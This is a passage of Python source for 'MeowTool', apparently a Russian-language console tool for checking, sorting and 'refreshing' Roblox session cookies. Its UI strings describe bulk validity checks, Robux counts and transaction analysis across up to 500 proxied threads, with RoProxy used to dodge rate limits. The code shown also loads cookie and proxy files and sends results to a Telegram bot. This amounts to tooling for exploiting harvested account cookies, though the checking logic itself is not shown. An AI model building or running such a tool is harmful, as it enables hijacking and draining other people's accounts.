            MT_Play_The_Sound_At_The_End_Of_The_Work       = 'Воспроизвести звук по окончании работы'
            MT_Show_Amount_Of_Lines_In_Files               = 'Показать количество строк в файлах'
            MT_Count_Robux_In_Total                        = 'Считать робуксы в общей сложности'
            MT_Cookie                                      = 'Куки'
            MT_Format                                      = 'Формат'
            MT_Enable_At_Least_One_Place_To_Start_Analysis = 'Включи хотя бы один плейс, чтобы начать анализ'
            MT_Number_Of_Threads_For_Transaction_Analysis  = 'Потоков для анализа транзакций'
            MT_Output_Filename                             = 'Название выходного файла'
            MT_Name_Output_File_The_Same_As_Input_File     = 'Называть выходной файл так же, как входной'
            MT_Transaction_With_This_Name_Already_Exists   = 'Транзакция с таким названием уже существует'
            MT_Enter_A_Transaction_Name                    = 'Введи название транзакции'
            MT_Add_A_Transaction                           = 'Добавить транзакцию'
            MT_Ignore                                      = 'Игнорировать'
            MT_Ignore_All                                  = 'Игнорировать всё'
            MT_Do_Not_Ignore_All                           = 'Не игнорировать всё'
            MT_Important                                   = 'Важно'
            MT_Ignore_List                                 = 'Игнор-лист'
            MT_Discover_New_Names_For_Ignore_List          = 'Обнаруживать новые названия для игнор-листа'
            MT_Save_Old_Versions                           = 'Сохранять старые версии'
            MT_Updates                                     = 'Обновления'
            MT_Yes                                         = 'Да'
            MT_No                                          = 'Нет'
            MT_Use_SSL                                     = 'Использовать SSL'
            MT_Max_Indentation                             = 'Максимальный отступ'
            MT_No_Indentation                              = 'Без отступа'
            MT_Transaction_Analysis                        = 'Анализ транзакций'
            MT_Save_All_Places_In_One_File                 = 'Сохранять все плейсы в один файл'
            MT_Save_Places_To_Different_Files              = 'Сохранять плейсы в разные файлы'
            MT_Add_Nick_After_Cookie_In_Folder_Names       = 'Добавлять ник после куки в названиях папок'
            MT_Add_Robux_After_Place_In_File_Names         = 'Добавлять робуксы после плейса в названиях файлов'
            MT_Indentation_Option                          = 'Вариант отступа'
            MT_Item                                        = 'Предмет'
            MT_Price                                       = 'Цена'
            MT_Date                                        = 'Дата'
            MT_You_Are_Using_Version_Of_Program            = f'Ты используешь {VERSIONS['MeowTool']} версию программы'
            MT_Open_Latest_Changes                         = 'Открыть последние изменения'
            MT_Open_MeowTool_On_GitHub                     = 'Открыть MeowTool на GitHub'
            MT_Open_A_Topic_On_LolzTeam                    = 'Открыть тему на LolzTeam'
            MT_Open_The_Showcase_On_YouTube                = 'Открыть демонстрацию на YouTube'
            MT_Open_PM_With_Developer_In_Telegram          = 'Открыть ЛС с разработчиком в Телеграм'
            MT_About_The_Program                           = 'О программе'
            MT_Check_For_Updates                           = 'Проверять обновления'
            MT_No_Cookies_Found                            = 'Куки не найдены'
            MT_All_Cookies_Were_Invalid                    = 'Все куки оказались невалидными'
            MT_Number_Of_Threads_For_Valid_Checker         = 'Потоков для валид чекера'
            MT_Number_Of_Threads_For_Main_Checker          = 'Потоков для основного чекера'
            MT_Incorrect_Number_Of_Threads_500             = 'Не превышай ограничение на 500 потоков'
            MT_Enter_Number_Of_Threads                     = 'Введи количество потоков'
            MT_First_We_Check_For_Valid                    = 'Сначала проверяем на валид'
            MT_Valid                                       = 'Валидных'
            MT_Invalid                                     = 'Невалидных'
            MT_First_Check_All_Cookies_For_Valid           = 'Сначала проверять все куки на валид'
            MT_No_Cookie_Was_Found                         = 'Ни одного куки не найдено, проверка отменена'
            MT_No_Proxy_Was_Found                          = 'Ни одного прокси не найдено, проверка отменена'
            MT_Auto_Protocol                               = 'Авто протокол'
            MT_Use_Proxy                                   = 'Использовать прокси'
            MT_Auto_Protocol_If_Not_Specified              = 'Протокол, если не указан в файле'
            MT_Any                                         = 'Любая'
            MT_Key_To_Continue                             = 'Клавиша для продолжения'
            MT_File_Was_Not_Created                        = 'Файл не был создан'
            MT_File_Is_Missing                             = 'Файл куда-то пропал, странно'
            MT_Incorrect_Cookies_Removed                   = 'Удалено некорректных куки'
            MT_Error                                       = 'Ошибка'
            MT_50_Cookies_In_Once                          = '50 куки за раз'
            MT_50_Cookies_In_60_Seconds                    = '50 куки в 60 секунд'
            MT_Send_Some_Requests_Through_RoProxy          = 'Отправлять некоторые запросы через RoProxy'
            MT_Rate_Limit_Has_Been_Reached                 = 'Достигнут Rate-Limit'
            MT_Checker                                     = 'Чекер'
            MT_Proxy                                       = 'Прокси'
            MT_The_Name_Cannot_Be_Empty                    = 'Название не может быть пустым'
            MT_Do_Not_Use_Characters_Such_As               = 'Не используй такие символы, как'
            MT_Enter_A_New_Title                           = 'Введи новое название'
            MT_Console_Title                               = 'Название консоли'
            MT_Show_Place_ID_Next_To_The_Name              = 'Показывать ID плейса рядом с названием'
            MT_Disable_Warnings_For_Links                  = 'Отключить предупреждения для ссылок'
            MT_Disable_Warnings_For_Dangerous_Actions      = 'Отключить предупреждения для опасных действий'
            MT_Show_Cookie                                 = 'Показать куки'
            MT_Data                                        = 'Данные'
            MT_Find                                        = 'Найти'
            MT_Save_Invalid_Cookies                        = 'Сохранять невалидные куки'
            MT_Save_Cookies_Added_Manually                 = 'Сохранять куки, добавленные вручную'
            MT_History_Manual                              = 'История (ручная)'
            MT_Save_Cookies_Checked_By_Checker             = 'Сохранять куки, проверенные чекером'
            MT_History_Checker                             = 'История (чекер)'
            MT_Cookie_Control_Panel                        = 'Панель управления куком'
            MT_Start_Refresher                             = 'Запустить рефрешер'
            MT_Wait                                        = 'Подожди', 'Ожидание'
            MT_Can_Run                                     = 'Можно запустить'
            MT_Do_You_Sure                                 = 'Ты уверен?'
            MT_I_Am_Sure                                   = 'Я уверен'
            MT_Not_Yet                                     = 'Ещё нет'
            MT_Reset_To_Default_Settings                   = 'Сбросить настройки по умолчанию'
            MT_Reload_Config                               = 'Перезагрузить конфиг'
            MT_New_Cookie                                  = 'Новый куки'
            MT_In                                          = 'В'
            MT_Enter_A_Cookie                              = 'Введи кук', 'Ввести кук'
            MT_Incorrect_Cookie                            = 'Некорретный кук'
            MT_Invalid_Cookie                              = 'Невалидный куки'
            MT_Single_Mode                                 = 'Одиночный режим'
            MT_Mass_Mode                                   = 'Массовый режим'
            MT_Could_Not_Connect_To_The_API                = 'Не удалось подключиться к API'
            MT_Trying_To_Connect_Again                     = 'Пытаемся подключиться ещё раз'
            MT_Bind                                        = 'Бинд'
            MT_Show_Lable_MeowTool                         = 'Показывать надпись \'MeowTool\''
            MT_Show_Lable_by_h1kken                        = 'Показывать надпись \'by h1kken :3\''
            MT_The_Parameter_Can_Only_Be_A_Number          = 'Параметр может быть только числом'
            MT_Add_A_Parameter                             = 'Добавить параметр'
            MT_Sort                                        = 'Сортировать'
            MT_Sorting                                     = 'Сортировка'
            MT_The_Place_Has_No_Gamepasses_And_Badges      = 'У плейса нет геймпассов и бейджей'
            MT_Custom_Places                               = 'Кастомные плейсы'
            MT_Enable_All                                  = 'Включить всё'
            MT_Disable_All                                 = 'Выключить всё'
            MT_Id                                          = 'Айди'
            MT_Nickname                                    = 'Никнейм'
            MT_Name                                        = 'Название'
            MT_Link                                        = 'Ссылка'
            MT_Duplicated_Cookies_Removed                  = 'Удалено одинаковых куки'
            MT_Unique_Cookies_Found                        = 'Найдено уникальных куки'
            MT_Successfully_Uploaded_In                    = 'Успешно выгружено в'
            MT_Place_ID                                    = 'ID плейса'
            MT_Place_Name                                  = 'Название плейса'
            MT_Place_Link                                  = 'Ссылка на плейс'
            MT_Gamepasses                                  = 'Геймпассы'
            MT_Badges                                      = 'Бейджи'
            MT_Remove_Emojies                              = 'Удалять эмодзи из названия'
            MT_Remove_Round_Brackets                       = 'Удалять (и то, что внутри них) из названия'
            MT_Remove_Square_Brackets                      = 'Удалять [и то, что внутри них] из названия'
            MT_Upload_All_Info_Gamepasses_And_Badges       = 'Выгрузить всю информацию о геймпассах и бейджах из программы'
            MT_Enable_Something_To_Start_Checking          = 'Включи что-нибудь, чтобы начать проверку'
            MT_Save_Without_Protocol                       = 'Сохранять без протокола'
            MT_Save_In                                     = 'Сохранять в'
            MT_The_Data_Is_Saved_In                        = 'Данные сохранены в'
            MT_Incorrect_Length_Of_ID_50                   = 'Длина ID не может превышать 50 символов'
            MT_Incorrect_Length_Of_Parameter_20            = 'Длина параметра не может превышать 20 цифр'
            MT_Incorrect_Length_Of_Name_50                 = 'Длина названия не может превышать 50 символов'
            MT_Incorrect_Length_Of_Config_Name_50          = 'Длина названия конфига не может превышать 50 символов'
            MT_Gamepass_With_This_Name_Already_Exists      = 'Геймпасс с таким названием уже существует'
            MT_Add_A_Gamepass_Name                         = 'Добавить название геймпасса'
            MT_Found_Data_On                               = 'Найденные данные по'
            MT_The_Place_Has_No_Gamepasses                 = 'У плейса нет геймпассов'
            MT_The_Place_Has_No_Badges                     = 'У плейса нет бейджей'
            MT_Gamepasses_Parser_From_The_Place            = 'Парсер геймпассов плейса'
            MT_Badges_Parser_From_The_Place                = 'Парсер бейджей плейса'
            MT_Misc                                        = 'Разное'
            MT_Seconds                                     = 'сек'
            MT_Waiting_Time                                = 'Время ожидания'
            MT_Output_Total                                = 'Выводить итоговые данные'
            MT_Found                                       = 'Найдено'
            MT_Lines                                       = 'Строк'
            MT_Start_Sorting                               = 'Начать сортировку'
            MT_Enter_The_Parameter_Value                   = 'Введи значение параметра'
            MT_Enter_The_Waiting_Time                      = 'Введи время в секундах'
            MT_Enter_The_Gamepass_Name                     = 'Введи название геймпасса'
            MT_Enter_The_Place_ID                          = 'Введи ID плейса'
            MT_Enter_The_Bundle_ID                         = 'Введи ID бандла'
            MT_Gamepasses                                  = 'Геймпассы'
            MT_Badges                                      = 'Бейджи'
            MT_Fix_Console                                 = 'Починить консоль'
            MT_Settings                                    = 'Настройки'
            MT_General                                     = 'Общее'
            MT_Main                                        = 'Основное'
            MT_Places                                      = 'Плейсы'
            MT_Language                                    = 'Язык'
            MT_Configs                                     = 'Конфиги'
            MT_Check                                       = 'Проверять'
            MT_Save                                        = 'Сохранить', 'Сохранять'
            MT_Auto_Save_Changes                           = 'Авто. сохранение изменений'
            MT_Update_List                                 = 'Обновить список'
            MT_Back                                        = 'Назад'
            MT_Close_Program                               = 'Закрыть программу'
            MT_Add_A_Bundle_By_ID                          = 'Добавить бандл по ID'
            MT_Add_A_Place_By_ID                           = 'Добавить плейс по ID'
            MT_Enter_Something                             = 'Введи что-то'
            MT_Create_Config                               = 'Создать конфиг'
            MT_Cancel                                      = 'Отмена'
            MT_Load_On_Launch                              = 'Загружать при запуске'
            MT_Load                                        = 'Загрузить'
            MT_File_Location                               = 'Расположение файла'
            MT_Rename                                      = 'Переименовать'
            MT_Delete                                      = 'Удалить'
            MT_Enter_Name_For_New_Config                   = 'Введи название нового конфига'
            MT_Enter_New_Name_For_Config                   = 'Введи новое название конфига'
            MT_Enter_New_Filename                          = 'Введи новое название файла'
            MT_Parameter_With_This_Value_Already_Exists    = 'Параметр с таким значением уже существует'
            MT_Bundle_With_This_ID_Already_Exists          = 'Бандл с таким ID уже существует'
            MT_Place_With_This_ID_Already_Exists           = 'Плейс с таким ID уже существует'
            MT_Incorrent_Bundle_ID                         = 'Некорректный ID бандла'
            MT_Incorrent_Place_ID                          = 'Некорректный ID плейса'
            MT_Incorrect_File_Name                         = 'Некорректное имя файла'
            MT_File_With_This_Name_Already_Exists          = 'Файл с таким названием уже существует'
            MT_Incorrect_Waiting_Time                      = 'Время ожидания не может быть больше 3600 секунд'
            MT_Incorrect_Value                             = 'Некорректное значение'
            MT_Of                                          = 'из'
            MT_Start_Checking_File                         = 'Проверяем файл'
            MT_Checking_Complete                           = 'Проверка завершена'
            MT_Sorting_File                                = 'Сортируем файл'
            MT_Sorting_Complete                            = 'Сортировка завершена'
            MT_Press_Any_Key_To_Continue                   = 'Нажми любую клавишу чтобы продолжить'
            MT_Press_Enter_To_Continue                     = 'Нажми Enter чтобы продолжить'
            MT_Request                                     = 'Запрос'
            MT_Everything_Or_Something_Is_On               = 'всё или что-то включено, всегда'
            MT_Everything_Is_On_Or_Off                     = 'всё включено или выключено, всегда'
            MT_Total                                       = 'В', 'С', 'Е', 'Г', 'О'
            MT_Roblox                                      = 'Роблокс'
            MT_Cookie_Sorter                               = 'Куки сортер'
            MT_Cookie_Checker                              = 'Куки чекер'
            MT_Cookie_Refresher                            = 'Куки рефрешер'
            MT_Beta                                        = '[БЕТА]'
            MT_Only_Goodness                               = 'Только добра'
            MT_Hi                                          = 'Привет'

### Основные функции

async def lableASCII():
    # Надпись 'MeowTool'
    if config['General']['Show_Lable_MeowTool']:
        ASCII_MeowTool = [
            r'  __    __     ______     ______     __     __     ______     ______     ______     __        ',
            r' /\ "-./  \   /\  ___\   /\  __ \   /\ \  _ \ \   /\__  _\   /\  __ \   /\  __ \   /\ \       ',
            r' \ \ \-./\ \  \ \  __\   \ \ \ \ \  \ \ \/ ".\ \  \/_/\ \/   \ \ \ \ \  \ \ \ \ \  \ \ \____  ',
            r'  \ \ \ \ \ \  \ \    ‾\  \ \ ‾‾  \  \ \  /". \ \    \ \ \    \ \ ‾‾  \  \ \ ‾‾  \  \ \     \ ',
            r'   \/‾/  \/‾/   \/‾‾‾‾‾/   \/‾‾‾‾‾/   \/‾/   \/‾/     \/‾/     \/‾‾‾‾‾/   \/‾‾‾‾‾/   \/‾‾‾‾‾/ ',
            r'    ‾‾    ‾‾     ‾‾‾‾‾‾     ‾‾‾‾‾‾     ‾‾     ‾‾       ‾‾       ‾‾‾‾‾‾     ‾‾‾‾‾‾     ‾‾‾‾‾‾  '
        ]
        sys.stdout.write(f'{ANSI.FG.PINK + ANSI.DECOR.BOLD}{'\n'.join(ASCII_MeowTool)}\n{ANSI.CLEAR}')
    else:
        sys.stdout.write('\n')

    # Надпись 'by h1kken :3'
    if config['General']['Show_Lable_by_h1kken']:
        by_h1kken = [
                r' /‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾\ by h1kken :3 /‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾\ ',
                r' ‾‾‾ ‾ ‾‾  ‾‾  ‾‾  ‾‾‾  ‾‾  ‾‾  ‾‾ ‾ ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾ ‾ ‾‾  ‾‾  ‾‾  ‾‾‾  ‾‾  ‾‾  ‾‾ ‾ ‾‾‾ '
            ]
        sys.stdout.write(f'{ANSI.FG.RED + ANSI.DECOR.BOLD}{'\n'.join(by_h1kken)}\n{ANSI.CLEAR}')
    sys.stdout.flush()

async def cls():
    if os.name == 'nt': os.system('cls')
    else: os.system('clear')

async def playOSSound():
    sys.stdout.write('\a')
    sys.stdout.flush()

async def removeLines(amountOfLines: int):
    if amountOfLines:
        sys.stdout.write(f'\033[{amountOfLines}A\033[J')

async def removeBracketsAndIn(string: str, removeRound: bool, removeSquare: bool) -> str:
    newString = ''
    skip = 0
    for char in string:
        if char == '(' and removeRound or char == '[' and removeSquare:
            skip += 1
        elif char in (')', ']') and skip > 0:
            skip -= 1
        elif skip == 0:
            newString += char
    return newString

async def removeAllSpecialChars(string: str) -> str:
    return sub('[^A-Za-z0-9 ]+', '', string)

async def removeSpecialChars(string: str) -> str:
    """Chars will be removed:
    \n - \\\\, /, *, ?, :, ", <, >, |
    \n - from \\x00 to \\x1f"""
    return sub(r'[\\/*?:"<>|\x00-\x1f]', '', string)

async def removeEmojies(string: str) -> str:
    return replace_emoji(string, replace=' ') # Пробел, потому что есть разработчики использующие эмодзи как пробел между слов

async def removeTwoSpaces(string: str) -> str:
    return ' '.join(string.split()).strip()

async def amountOfLines(path: str) -> str:
    if not os.path.exists(f'{path}.txt'):
        return '0 lines'

    try:
        with open(f'{path}.txt', 'r', encoding='UTF-8') as f:
            amount = sum(1 for _ in f)
    except Exception:
        return 'error'

    return f'{amount} line{'s' if amount != 1 else ''}'

async def waitingInput():
    if config['General']['Press_Any_Key_To_Continue']:
        sys.stdout.write(f' [{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.DECOR.FLASHING1}{MT_Press_Any_Key_To_Continue}...')
        sys.stdout.flush()
        getch()
    else:
        sys.stdout.write(f' [{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.DECOR.FLASHING1}{MT_Press_Enter_To_Continue}...')
        sys.stdout.flush()
        input()

    sys.stdout.write(ANSI.CLEAR)
    await cls()
    await lableASCII()

async def errorOrCorrectHandler(isError: bool, removeLines_: int, message: str, path=''):
    await removeLines(removeLines_)
    sys.stdout.write(f'\r {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{path}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}{f'[{ANSI.FG.RED}X{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if isError else f'[{ANSI.FG.GREEN}>{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} ┃ {message}\n\n')
    await waitingInput()

async def autoSaveConfig():
    if configLoader['Saver']['Auto_Save_Changes']:
        async with aiofiles.open(f'Settings\\Configs\\{configLoader['Loader']['Current_Config']}.toml', 'w', encoding='UTF-8') as f:
            await f.write(dumps(config))

async def autoSaveConfigAndRemoveLinesInSettings(caseValue: str, autoSaveConfig_: tuple, removeLines_: tuple, numberOfLines: int):
    if caseValue                   in tuple(autoSaveConfig_):                       await autoSaveConfig()
    if numberOfLines and caseValue in tuple(autoSaveConfig_) + tuple(removeLines_): await removeLines(numberOfLines)

async def printFiles(category: str, path: str, printFiles: bool) -> list:
    os.makedirs(path, exist_ok=True)
    listOfFiles = [file[:-4] for file in os.listdir(path)
                   if file.lower().endswith('.txt') and file.lower() not in ('proxies.txt', '.txt')]

    if printFiles:
        for index, file in enumerate(listOfFiles):
            sys.stdout.write(f' {ANSI.DECOR.BOLD}{f'[{ANSI.FG.PINK}{index + 1}{ANSI.CLEAR + ANSI.DECOR.BOLD}]'.rjust(len(str(len(listOfFiles))) + 15)} ┃ {file} {f'({await amountOfLines(f'{path}\\{file}')})' if config['Roblox']['General'][f'Show_Amount_Of_Lines_In_Files'] else ''}{ANSI.CLEAR}\n')

    return listOfFiles

async def openLink(url: str, path: str, removeLines_: int):
    if not config['General']['Disable_Warnings_For_Links']:
        whileTrueStageLink = True
        await removeLines(removeLines_)
        while whileTrueStageLink:
            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{path}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}?{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Following_The_Link}: {ANSI.DECOR.UNDERLINE1}{url}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n [{ANSI.FG.YELLOW}?{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Do_You_Sure}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n  ┃\n [{ANSI.FG.GREEN}Y{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_I_Am_Sure}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n [{ANSI.FG.RED}N{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Not_Yet}{ANSI.CLEAR}\n\n')
            confirmTheAction = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
            match confirmTheAction.upper():
                case 'Y' | 'Н':
                    whileTrueStageLink = False
                    webbrowser.open(url)
                case 'N' | 'Т':
                    whileTrueStageLink = False

            await removeLines(9)
    else:
        webbrowser.open(url)
        await removeLines(removeLines_)

def createFoldersAndFiles():
    FOLDERS = [
        'Proxy\\Checker',
        'Roblox\\Cookie Sorter',
        'Roblox\\Cookie Checker',
        'Roblox\\Cookie Refresher\\Mass Mode',
        'Roblox\\Transaction Analysis'
    ]
    FILES = [
        'Proxy\\Checker\\proxies.txt',
        'Roblox\\Cookie Checker\\cookies.txt',
        'Roblox\\Cookie Checker\\proxies.txt',
        'Roblox\\Cookie Refresher\\Mass Mode\\cookies.txt',
        'Roblox\\Transaction Analysis\\cookies.txt',
        'Roblox\\Transaction Analysis\\proxies.txt'
    ]

    for folder in FOLDERS:
        os.makedirs(folder, exist_ok=True)

    for file in FILES:
        if not os.path.exists(file):
            open(file, 'w')

async def downloadPythonVersion():
    try:
        response = requests.get('https://raw.githubusercontent.com/h1kken/MeowTool/refs/heads/meow/MeowTool.py', timeout=5)
        response.raise_for_status()
        data = response.text.replace('\r', '')
        userProgramName = os.path.basename(__file__)

        if configLoader['Updater']['Save_Old_Versions']:
            os.makedirs('Versions', exist_ok=True)
            move(userProgramName, f'Versions\\{userProgramName}')
            parameters = [3, '.py'] if userProgramName.lower().endswith('.py') else [4, '.exe']
            os.rename(f'Versions\\{userProgramName}', f'Versions\\{userProgramName[:-parameters[0]]} ({VERSIONS['MeowTool']}){parameters[1]}')

        with open(userProgramName, 'w', encoding='UTF-8', errors='ignore')as f:
            f.write(data)
        if sys.platform == 'win32': os.startfile(userProgramName)
        sys.exit()
    except Exception:
        while True:
            sys.stdout.write(f'  {ANSI.DECOR.BOLD}[{ANSI.FG.PINK + ANSI.DECOR.BOLD}<3{ANSI.CLEAR + ANSI.DECOR.BOLD}] Не смогли скачать обновление, возможно нестабильный интернет. Что будем делать? :3\n\n  [{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] Попробуем ещё раз\n  [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] Продолжить запуск{ANSI.CLEAR}\n\n')
            couldNotDownloadUpdate = input(f'  {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] Введи что-то:{ANSI.CLEAR} ')
            match couldNotDownloadUpdate:
                case '1':
                    await removeLines(6)
                    sys.stdout.write(f'  {ANSI.DECOR.BOLD}[{ANSI.FG.PINK + ANSI.DECOR.BOLD}<3{ANSI.CLEAR + ANSI.DECOR.BOLD}] Пытаемся ещё раз... :3{ANSI.CLEAR}\r')
                    break
                case '2':
                    await removeLines(6)
                    return
                case _:
                    await removeLines(6)

async def downloadExecutableVersion(version: str):
    webbrowser.open(f'https://github.com/h1kken/MeowTool/releases/download/{version}/MeowTool.exe')

    if configLoader['Updater']['Save_Old_Versions']:
        os.makedirs('Versions', exist_ok=True)
        userProgramName = os.path.basename(__file__)
        move(userProgramName, f'Versions\\{userProgramName}')
        parameters = [3, '.py'] if userProgramName.lower().endswith('.py') else [4, '.exe']
        os.rename(f'Versions\\{userProgramName}', f'Versions\\{userProgramName[:-parameters[0]]} ({VERSIONS['MeowTool']}){parameters[1]}')

    sys.exit()

async def checkUpdates():
    if configLoader['Updater']['Check_For_Updates']:
        while True:
            sys.stdout.write(f'  {ANSI.DECOR.BOLD}[{ANSI.FG.PINK + ANSI.DECOR.BOLD}<3{ANSI.CLEAR + ANSI.DECOR.BOLD}] Проверяем твою трендовость... :3     {ANSI.CLEAR}\r')
            try:
                response = requests.get('https://raw.githubusercontent.com/h1kken/MeowTool/refs/heads/meow/version.txt', timeout=3)
                response.raise_for_status()
                latestVersion = response.text.strip()
                if latestVersion == VERSIONS['MeowTool']:
                    sys.stdout.write(f'  {ANSI.DECOR.BOLD}[{ANSI.FG.PINK + ANSI.DECOR.BOLD}<3{ANSI.CLEAR + ANSI.DECOR.BOLD}] Ура! У тебя последняя версия... :3{ANSI.CLEAR}\r')
                    return
                else:
                    while True:
                        sys.stdout.write(f'  {ANSI.DECOR.BOLD}[{ANSI.FG.PINK + ANSI.DECOR.BOLD}<3{ANSI.CLEAR + ANSI.DECOR.BOLD}] Ух-ты! Доступна новая версия, будем качать? :3\n\n  [{ANSI.FG.YELLOW}?{ANSI.CLEAR + ANSI.DECOR.BOLD}] Текущая версия: {VERSIONS['MeowTool']}\n  [{ANSI.FG.YELLOW}?{ANSI.CLEAR + ANSI.DECOR.BOLD}] Последняя версия: {latestVersion}\n\n  [{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] Да, хочу \'.py\' версию\n  [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] Да, хочу \'.exe\' версию\n  [{ANSI.FG.PINK}3{ANSI.CLEAR + ANSI.DECOR.BOLD}] Нет, как-нибудь потом{ANSI.CLEAR}\n\n')
                        newUpdateAvailable = input(f'  {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] Введи что-то:{ANSI.CLEAR} ')
                        match newUpdateAvailable:
                            case '1':
                                await removeLines(10)
                                while True:
                                    sys.stdout.write(f'  {ANSI.DECOR.BOLD}[{ANSI.FG.PINK + ANSI.DECOR.BOLD}<3{ANSI.CLEAR + ANSI.DECOR.BOLD}] Добываем данные для обновления... :3{ANSI.CLEAR}\r')
                                    await downloadPythonVersion()
                            case '2':
                                await downloadExecutableVersion(latestVersion)
                            case '3':
                                await removeLines(10)
                                return
                            case _:
                                await removeLines(10)
            except Exception:
                while True:
                    sys.stdout.write(f'  {ANSI.DECOR.BOLD}[{ANSI.FG.PINK + ANSI.DECOR.BOLD}<3{ANSI.CLEAR + ANSI.DECOR.BOLD}] Не смогли проверить, возможно нестабильный интернет. Что будем делать? :3\n\n  [{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] Проверим ещё раз\n  [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] Продолжить запуск{ANSI.CLEAR}\n\n')
                    couldNotCheckUpdate = input(f'  {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] Введи что-то:{ANSI.CLEAR} ')
                    match couldNotCheckUpdate:
                        case '1':
                            await removeLines(6)
                            break
                        case '2':
                            await removeLines(6)
                            return
                        case _:
                            await removeLines(6)

async def updateFixer_v2_0_0():
    UPDATE_FIXER_PARAMS = {
        'Custom_Gamepasses_List': 'Custom_Gamepasses_Names',
        'Favorite_Places_List':   'Favorite_Places_IDs',
        'Bundles_List':           'Bundles_IDs'
    }

    for new, old in UPDATE_FIXER_PARAMS.items():
        try:
            config['Roblox']['CookieChecker']['Main'][new] = config['Roblox']['CookieChecker']['Main'][old]
            config['Roblox']['CookieChecker']['Main'].remove(old)
        except Exception:
            pass
    await autoSaveConfig()

async def updateFixer_v2_1_0():
    UPDATE_FIXER_PARAMS = ['Donate_All_Time', 'Rap', 'Gamepasses', 'Badges', 'Custom_Gamepasses', 'Favorite_Places', 'Bundles', 'Sessions']

    for param in UPDATE_FIXER_PARAMS:
        try:
            if config['Roblox']['CookieChecker']['Main'][f'{param}_Max_Check_Pages'] == 0:
                config['Roblox']['CookieChecker']['Main'][f'{param}_Max_Check_Pages'] = -1
        except Exception:
            pass
    await autoSaveConfig()

async def getProxiesFromFile(useProxy: bool, pathToProxies: str, pathError: str, removeLines_: int):
    if useProxy:
        try:
            proxiesFromFile = {proxy.strip() for proxy in open(pathToProxies, 'r', encoding='UTF-8').readlines()
                               if len(proxy.split(':')) in (4, 5)}
            if not proxiesFromFile:
                raise FileNotFoundError

            return list(proxiesFromFile)
        except FileNotFoundError:
            return await errorOrCorrectHandler(True, removeLines_, MT_No_Proxy_Was_Found, pathError)

async def getCookiesFromFile(pathToCookies: str, pathError: str, removeLines_: int):
    cookiesSet = set()
    try:
        with open(pathToCookies, 'r', encoding='UTF-8') as f:
            for line in f:
                match = search(COOKIE_PATTERN, line.strip())
                if match:
                    cookiesSet.add(match.group(0))
        if not cookiesSet:
            raise FileNotFoundError

        return cookiesSet
    except FileNotFoundError:
        return await errorOrCorrectHandler(True, removeLines_, MT_No_Cookie_Was_Found, pathError)

async def makeArchive(path: str):
    if os.path.exists(path):
        with ZipFile(f'{path}.zip', 'w', ZIP_DEFLATED) as zipf:
            pathLength = len(path) + 1
            for root, _, files in os.walk(path):
                for file in files:
                    filePath = os.path.join(root, file)
                    arcname = filePath[pathLength:]
                    zipf.write(filePath, arcname)

async def sendMessageTelegramBot(token: str, chatID: str, text: str = None, filePath: str = None):
    if len(token.split(':')) != 2:
        return sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.RED}{MT_Telegram[1]}{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.RED}{MT_Unsuccessfully}{ANSI.CLEAR + ANSI.DECOR.BOLD} | {MT_Invalid_Token_Format}... :<\n')

    try:
        bot = Bot(token=token)

        if filePath:
            if not os.path.exists(filePath):
                raise FileNotFoundError

            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}{MT_Telegram[1]}{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Send[1]} {MT_Results_To_Telegram[0].lower() + MT_Results_To_Telegram[1:]}\r')
            sys.stdout.flush()
            await bot.send_document(
                chat_id=chatID,
                document=FSInputFile(filePath),
                caption=text,
                parse_mode=ParseMode.MARKDOWN_V2
            )
            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}{MT_Telegram[1]}{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.GREEN}{MT_Successfully}{ANSI.CLEAR + ANSI.DECOR.BOLD} | {MT_Send[2]} {MT_Results_To_Telegram[0].lower() + MT_Results_To_Telegram[1:]} :3\n')
        elif text:
            await bot.send_message(
                chat_id=chatID,
                text=text
            )
